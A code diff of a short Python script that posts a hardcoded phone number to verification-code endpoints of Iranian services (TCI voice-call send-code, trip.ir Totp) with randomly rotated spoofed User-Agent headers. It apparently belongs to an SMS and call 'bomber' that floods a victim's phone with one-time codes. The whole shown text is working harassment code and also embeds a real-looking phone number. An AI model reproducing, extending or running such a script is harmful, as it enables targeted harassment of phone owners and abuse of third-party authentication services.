@@ -1,7 +1,6 @@
 import requests
 import random
 number = "9373058966"
-number = "9373058966"
 heads = [
     {
     'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; rv:76.0)Gecko/20100101 Firefox/76.0',
@@ -39,14 +38,9 @@ random_head = random.choice(heads)
 
 
 
-url_tci = "https://my.tci.ir/api/v1/auth/send-code"
-json_tci = {
-	"app_hash": "app_hash",
-	"app_id": 1,
-	"method": "VOICE_CALL",
-	"phone_number": "98" + number
-}
+url_trip = "https://gateway.trip.ir/api/Totp"
+json_trip = {"PhoneNumber": "0" + number}
 
 
-req_tci = requests.post(url=url_tci,json=json_tci,headers=random_head)
-print("-tci",req_tci)
+req_trip = requests.post(url=url_trip,json=json_trip,headers=random_head)
+print("4-trip",req_trip)
